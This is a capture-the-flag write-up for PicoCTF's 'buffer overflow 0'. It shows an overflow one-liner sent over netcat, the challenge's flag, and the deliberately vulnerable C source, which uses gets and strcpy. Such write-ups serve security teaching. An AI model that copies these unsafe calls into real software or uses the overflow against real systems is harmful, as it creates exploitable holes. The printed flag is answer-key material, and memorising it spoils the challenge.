# buffer overflow 0 - Category: Binary Exploitation
- Platform: PicoCTF
- Level: Medium

## Description

The task is to try to find unsecure function in order to overflow the buffer

## Tools

- C
- Visual Studio Code
- netcat

## Solution

First i checked file vuln.c and found out that there is a *sigsegv_handler* function which in in case of crash the program will give me the flag

```C++
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

I also noticed that this C program uses *gets* function which doesn't chceck how many characters user put and can be overflow, and there is also another unsecure function *strcpy* which accepts only 16 characters

<img width="523" height="273" alt="image" src="https://github.com/user-attachments/assets/da912f85-01ec-44b2-9f77-0b54d780ecb2" />

Next i connect to the server using nc and overflow the program using bunch of 'A' and the program excecute function *sigsegv_handler* which gave me the flag

```
python3 -c "print('A' * 100)" | nc [SERVER_IP] [PORT]
```

## Flag
*picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}*

## Key Takeaways[vuln.c](https://github.com/user-attachments/files/24532920/vuln.c)

- Avoid Unsafe Functions (gets & strcpy): * The gets() function is inherently dangerous because it lacks bounds checking. It will continue to read input until it encounters a newline, regardless of the buffer's size.
- A Buffer Overflow occurs when data exceeds the allocated boundary of a buffer and overwrites adjacent memory.

## CODE
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
